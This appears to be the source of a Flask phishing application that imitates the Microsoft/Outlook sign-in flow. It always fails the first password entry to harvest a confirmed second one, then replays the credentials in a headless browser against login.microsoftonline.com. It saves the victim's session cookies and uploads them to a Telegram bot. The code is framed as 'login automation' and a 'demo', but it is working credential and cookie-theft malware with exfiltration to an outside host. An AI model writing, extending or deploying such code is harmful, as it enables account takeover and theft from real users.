from flask import Flask, request, render_template, jsonify, session, redirect, url_for, flash
import re
import dns.resolver
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from time import sleep
import requests
import logging
import os
from flask_session import Session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
# from python_decouple import config
# Use os.environ instead for simplicity
def config(key, default=None):
    return os.environ.get(key, default)
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email
import bcrypt
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sentry_sdk
import json
import redis
import uuid
from functools import wraps

# Initialize Sentry for monitoring (optional)
sentry_dsn = config('SENTRY_DSN', default=None)
if sentry_dsn:
    sentry_sdk.init(dsn=sentry_dsn)

app = Flask(__name__)
app.secret_key = config('SECRET_KEY', default='dev-key-change-in-production')

# Enhanced logging configuration
if not os.path.exists('logs'):
    os.makedirs('logs')

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Session configuration - using filesystem instead of Redis for simplicity
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_FILE_DIR'] = './flask_session'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_USE_SIGNER'] = True
app.config['SESSION_KEY_PREFIX'] = 'outlook_automation:'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)

# Database configuration  
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///users.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize extensions
Session(app)
db = SQLAlchemy(app)
csrf = CSRFProtect(app)
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"]
)

# Redis connection for session debugging (optional)
try:
    redis_client = redis.from_url('redis://localhost:6379/0')
    redis_client.ping()
    logger.info("Redis connection established successfully")
except Exception as e:
    logger.info(f"Redis not available, using filesystem sessions: {e}")
    redis_client = None

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(128))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)

class SessionLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(255), nullable=False)
    user_email = db.Column(db.String(120))
    action = db.Column(db.String(100), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    success = db.Column(db.Boolean, default=True)
    error_message = db.Column(db.Text)

class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_email = db.Column(db.String(120), nullable=False)
    session_id = db.Column(db.String(255), nullable=False)
    attempt_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class LoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Next')

def log_session_activity(action, user_email=None, success=True, error_message=None):
    """Log session activity for debugging purposes"""
    try:
        log_entry = SessionLog()
        log_entry.session_id = session.get('session_id', 'unknown')
        log_entry.user_email = user_email
        log_entry.action = action
        log_entry.ip_address = get_remote_address()
        log_entry.user_agent = request.user_agent.string
        log_entry.success = success
        log_entry.error_message = error_message
        db.session.add(log_entry)
        db.session.commit()
        logger.info(f"Session activity logged: {action} for {user_email}")
    except Exception as e:
        logger.error(f"Failed to log session activity: {e}")

def create_session_id():
    """Create a unique session ID"""
    if 'session_id' not in session:
        session['session_id'] = str(uuid.uuid4())
    return session['session_id']

def validate_email_domain(email):
    """Enhanced email domain validation"""
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        return False, "Invalid email format"
    
    domain = email.split('@')[1]
    try:
        # Check for MX records
        mx_records = dns.resolver.resolve(domain, 'MX')
        if not mx_records:
            return False, "Domain has no mail servers"
        
        logger.info(f"Domain {domain} validated successfully")
        return True, "Valid domain"
    except Exception as e:
        logger.error(f"MX lookup failed for {domain}: {e}")
        return False, f"Invalid domain: {str(e)}"

def setup_chrome_driver():
    """Setup Chrome WebDriver with proper options"""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(10)
        
        logger.info("Chrome WebDriver initialized successfully")
        return driver
    except Exception as e:
        logger.error(f"Failed to initialize Chrome WebDriver: {e}")
        raise

def extract_and_save_cookies(driver, email):
    """Extract cookies from WebDriver and save them"""
    try:
        cookies = driver.get_cookies()
        if not cookies:
            logger.warning("No cookies found in WebDriver")
            return False
        
        # Create cookies directory if it doesn't exist
        if not os.path.exists('cookies'):
            os.makedirs('cookies')
        
        # Save cookies with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'cookies/cookies_{email.replace("@", "_")}_{timestamp}.txt'
        
        with open(filename, 'w') as f:
            f.write(f"# Cookies extracted for {email} at {datetime.now()}\n")
            f.write(f"# Total cookies: {len(cookies)}\n\n")
            
            for cookie in cookies:
                f.write(f"Name: {cookie['name']}\n")
                f.write(f"Value: {cookie['value']}\n")
                f.write(f"Domain: {cookie['domain']}\n")
                f.write(f"Path: {cookie['path']}\n")
                f.write(f"Secure: {cookie['secure']}\n")
                f.write(f"HttpOnly: {cookie.get('httpOnly', False)}\n")
                f.write("-" * 50 + "\n")
        
        # Also save as JSON for easier parsing
        json_filename = f'cookies/cookies_{email.replace("@", "_")}_{timestamp}.json'
        with open(json_filename, 'w') as f:
            json.dump(cookies, f, indent=2)
        
        logger.info(f"Cookies saved to {filename} and {json_filename}")
        return filename
    except Exception as e:
        logger.error(f"Failed to extract and save cookies: {e}")
        return False

def send_cookies_to_telegram(filename, email):
    """Send cookies file to Telegram"""
    try:
        bot_token = config('BOT_TOKEN', default=None)
        chat_id = config('CHAT_ID', default=None)
        
        if not bot_token or not chat_id:
            logger.warning("Telegram bot token or chat ID not configured")
            return False
        
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        
        with open(filename, 'rb') as file:
            response = requests.post(
                url,
                data={
                    'chat_id': chat_id,
                    'caption': f'Cookies for {email} - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
                },
                files={'document': file},
                timeout=30
            )
        
        if response.status_code == 200:
            logger.info(f"Cookies sent to Telegram successfully for {email}")
            return True
        else:
            logger.error(f"Failed to send cookies to Telegram: {response.text}")
            return False
            
    except Exception as e:
        logger.error(f"Error sending cookies to Telegram: {e}")
        return False

@app.before_request
def before_request():
    """Initialize session before each request"""
    create_session_id()
    session.permanent = True

@app.route('/')
@limiter.limit("20 per minute")
def index():
    email = request.args.get('email', '').strip()
    step = request.args.get('step', 'email')
    error = request.args.get('error', '')
    
    log_session_activity("page_visit", user_email=email)
    
    # Email validation step
    if step == 'email' and email:
        valid, message = validate_email_domain(email)
        if not valid:
            flash(message, 'error')
            log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
            return render_template('index.html', step='email', error=message)
    
    form = LoginForm()
    sitekey = config('CLOUDFLARE_SITEKEY', default='')
    
    return render_template('index.html', 
                         form=form, 
                         email=email, 
                         step=step, 
                         error=error, 
                         sitekey=sitekey,
                         session_id=session.get('session_id'))

@app.route('/verify-turnstile', methods=['POST'])
@limiter.limit("10 per minute")
def verify_turnstile():
    """Verify Cloudflare Turnstile challenge"""
    try:
        token = request.form.get('cf-turnstile-response')
        if not token:
            return jsonify({'success': False, 'error': 'No token provided'})
        
        secret_key = config('CLOUDFLARE_SECRET_KEY', default='')
        if not secret_key:
            logger.warning("Cloudflare secret key not configured")
            return jsonify({'success': True})  # Allow in development
        
        response = requests.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            data={
                'secret': secret_key,
                'response': token,
                'remoteip': get_remote_address()
            },
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        
        result = response.json()
        success = result.get('success', False)
        
        log_session_activity("turnstile_verification", success=success, 
                           error_message=None if success else str(result.get('error-codes', [])))
        
        return jsonify({
            'success': success,
            'error-codes': result.get('error-codes', [])
        })
        
    except Exception as e:
        logger.error(f"Turnstile verification error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/', methods=['POST'])
@limiter.limit("10 per minute")
def process_form():
    form = LoginForm()
    
    if not form.validate_on_submit():
        flash('Form validation failed', 'error')
        return redirect(url_for('index'))
    
    # Verify Turnstile if configured
    turnstile_token = request.form.get('cf-turnstile-response')
    if config('CLOUDFLARE_SECRET_KEY', default=''):
        try:
            verify_response = requests.post(
                url_for('verify_turnstile', _external=True),
                data={'cf-turnstile-response': turnstile_token}
            )
            if not verify_response.json().get('success'):
                flash('Security verification failed', 'error')
                log_session_activity("security_verification_failed", success=False)
                return redirect(url_for('index'))
        except Exception as e:
            logger.error(f"Turnstile verification error in form processing: {e}")
    
    email = form.email.data.strip().lower()
    submit_action = request.form.get('submit', 'Next')
    
    if submit_action == 'Next':
        # Email step
        valid, message = validate_email_domain(email)
        if not valid:
            flash(message, 'error')
            log_session_activity("email_step_failed", user_email=email, success=False, error_message=message)
            return redirect(url_for('index', step='email', error='true'))
        
        log_session_activity("email_step_completed", user_email=email)
        return redirect(url_for('index', step='password', email=email))
    
    else:
        # Password step - perform login automation
        email = (request.args.get('email') or '').strip().lower()
        password = form.password.data
        
        if not email or not password:
            flash('Email and password are required', 'error')
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        # Check if user exists and password is correct
        user = User.query.filter_by(email=email).first()
        if not user:
            # Create new user for this demo (in production, you'd handle registration differently)
            hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            user = User()
            user.email = email
            user.password_hash = hashed_password
            db.session.add(user)
            db.session.commit()
            logger.info(f"New user created: {email}")
        
        if not bcrypt.checkpw(password.encode('utf-8'), user.password_hash.encode('utf-8')):
            flash('Invalid credentials', 'error')
            log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        # Two-pass authentication logic
        current_session_id = session.get('session_id')
        login_attempt = LoginAttempt.query.filter_by(
            user_email=email, 
            session_id=current_session_id
        ).first()
        
        if not login_attempt:
            # First attempt - create new attempt record
            login_attempt = LoginAttempt()
            login_attempt.user_email = email
            login_attempt.session_id = current_session_id
            login_attempt.attempt_count = 1
            db.session.add(login_attempt)
            db.session.commit()
            
            # Always fail first attempt
            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
            log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                               error_message="First attempt automatically failed - two-pass security")
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        elif login_attempt.attempt_count == 1:
            # Second attempt - proceed with automation
            login_attempt.attempt_count = 2
            login_attempt.updated_at = datetime.utcnow()
            db.session.commit()
            log_session_activity("second_attempt_proceeding", user_email=email)
            # Continue with Selenium automation below
        
        else:
            # More than 2 attempts - reset and start over
            login_attempt.attempt_count = 1
            login_attempt.updated_at = datetime.utcnow()
            db.session.commit()
            
            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
            log_session_activity("attempt_reset", user_email=email, success=False, 
                               error_message="Attempt counter reset - starting two-pass cycle again")
            return redirect(url_for('index', step='password', email=email, error='true'))
        
        # Perform Selenium automation
        driver = None
        try:
            log_session_activity("selenium_automation_started", user_email=email)
            driver = setup_chrome_driver()
            
            # Navigate to Microsoft login
            driver.get("https://login.microsoftonline.com")
            logger.info("Navigated to Microsoft login page")
            
            # Wait for and fill email
            email_field = WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.NAME, "loginfmt"))
            )
            email_field.clear()
            email_field.send_keys(email)
            
            # Click next
            next_button = driver.find_element(By.ID, "idSIButton9")
            next_button.click()
            
            # Wait for password field
            sleep(3)
            password_field = WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
            password_field.clear()
            password_field.send_keys(password)
            
            # Click sign in
            signin_button = driver.find_element(By.ID, "idSIButton9")
            signin_button.click()
            
            # Wait for login to complete
            sleep(10)
            
            # Check for errors
            current_url = driver.current_url
            page_source = driver.page_source.lower()
            
            if any(error_indicator in page_source for error_indicator in ['error', 'incorrect', 'invalid', 'failed']):
                if 'error' in current_url:
                    error_msg = "Login failed - invalid credentials or account issue"
                    logger.error(f"Login failed for {email}: error in URL")
                    log_session_activity("login_automation_failed", user_email=email, success=False, error_message=error_msg)
                    flash(error_msg, 'error')
                    return redirect(url_for('index', step='password', email=email, error='true'))
            
            # Extract and save cookies
            cookie_file = extract_and_save_cookies(driver, email)
            if not cookie_file:
                error_msg = "Failed to extract cookies"
                log_session_activity("cookie_extraction_failed", user_email=email, success=False, error_message=error_msg)
                flash(error_msg, 'error')
                return redirect(url_for('index', step='password', email=email, error='true'))
            
            # Send cookies to Telegram
            if send_cookies_to_telegram(cookie_file, email):
                log_session_activity("telegram_send_success", user_email=email)
            else:
                log_session_activity("telegram_send_failed", user_email=email, success=False)
            
            # Update user last login
            user.last_login = datetime.utcnow()
            db.session.commit()
            
            log_session_activity("login_automation_completed", user_email=email)
            logger.info(f"Successful login automation for {email}")
            
            flash('Login automation completed successfully!', 'success')
            return render_template('index.html', success=True, email=email)
            
        except TimeoutException as e:
            error_msg = f"Login timeout - please try again: {str(e)}"
            logger.error(f"Timeout during login automation for {email}: {e}")
            log_session_activity("login_timeout", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            
        except WebDriverException as e:
            error_msg = f"Browser automation error: {str(e)}"
            logger.error(f"WebDriver error for {email}: {e}")
            log_session_activity("webdriver_error", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            
        except Exception as e:
            error_msg = f"Unexpected error during login automation: {str(e)}"
            logger.error(f"Unexpected error during login for {email}: {e}")
            log_session_activity("unexpected_error", user_email=email, success=False, error_message=error_msg)
            flash(error_msg, 'error')
            
        finally:
            # Ensure driver is always cleaned up
            if driver:
                try:
                    driver.quit()
                    logger.info("WebDriver cleaned up successfully")
                except Exception as e:
                    logger.error(f"Error during WebDriver cleanup: {e}")
        
        return redirect(url_for('index', step='password', email=email, error='true'))

@app.route('/debug/sessions')
@limiter.limit("5 per minute")
def debug_sessions():
    """Debug endpoint to view session information"""
    try:
        session_data = {
            'current_session': dict(session),
            'session_id': session.get('session_id', 'Not set'),
            'redis_connection': 'Connected' if redis_client else 'Not connected'
        }
        
        # Get session files from filesystem or Redis keys
        if redis_client:
            try:
                keys = redis_client.keys('outlook_automation:*')
                session_data['redis_keys'] = [key.decode() for key in keys]
                session_data['redis_key_count'] = len(keys)
            except Exception as e:
                session_data['redis_error'] = str(e)
        else:
            # Count filesystem session files
            import glob
            session_files = glob.glob('./flask_session/*')
            session_data['session_files'] = len(session_files)
            session_data['session_storage'] = 'filesystem'
        
        # Get recent session logs
        recent_logs = SessionLog.query.order_by(SessionLog.timestamp.desc()).limit(20).all()
        
        return render_template('debug.html', 
                             session_data=session_data,
                             recent_logs=recent_logs)
                             
    except Exception as e:
        logger.error(f"Error in debug sessions: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/debug/clear-sessions', methods=['POST'])
@limiter.limit("2 per minute")
def clear_sessions():
    """Clear all sessions from storage (Redis or filesystem)"""
    try:
        count = 0
        if redis_client:
            # Clear Redis sessions
            keys = redis_client.keys('outlook_automation:*')
            if keys:
                redis_client.delete(*keys)
                count = len(keys)
            flash(f'Cleared {count} session(s) from Redis', 'success')
        else:
            # Clear filesystem sessions
            import glob
            import os
            session_files = glob.glob('./flask_session/*')
            for file in session_files:
                try:
                    os.remove(file)
                    count += 1
                except Exception:
                    pass
            flash(f'Cleared {count} session file(s) from filesystem', 'success')
        
        log_session_activity("sessions_cleared", success=True)
            
    except Exception as e:
        flash(f'Error clearing sessions: {str(e)}', 'error')
        logger.error(f"Error clearing sessions: {e}")
    
    return redirect(url_for('debug_sessions'))

@app.route('/health')
def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        from sqlalchemy import text
        db.session.execute(text('SELECT 1'))
        db_status = 'OK'
    except Exception as e:
        db_status = f'Error: {str(e)}'
    
    # Test session storage
    try:
        if redis_client:
            redis_client.ping()
            storage_status = 'Redis: OK'
        else:
            # Check if filesystem session directory exists
            import os
            if os.path.exists('./flask_session'):
                storage_status = 'Filesystem: OK'
            else:
                storage_status = 'Filesystem: Directory missing'
    except Exception as e:
        storage_status = f'Error: {str(e)}'
    
    return jsonify({
        'status': 'healthy',
        'database': db_status,
        'session_storage': storage_status,
        'timestamp': datetime.utcnow().isoformat()
    })

@app.errorhandler(429)
def ratelimit_handler(e):
    flash('Rate limit exceeded. Please try again later.', 'error')
    return render_template('index.html', error='Rate limit exceeded'), 429

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal server error: {error}")
    db.session.rollback()
    flash('An internal error occurred. Please try again.', 'error')
    return render_template('index.html', error='Internal server error'), 500

# Initialize database
with app.app_context():
    db.create_all()
    logger.info("Database tables created successfully")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
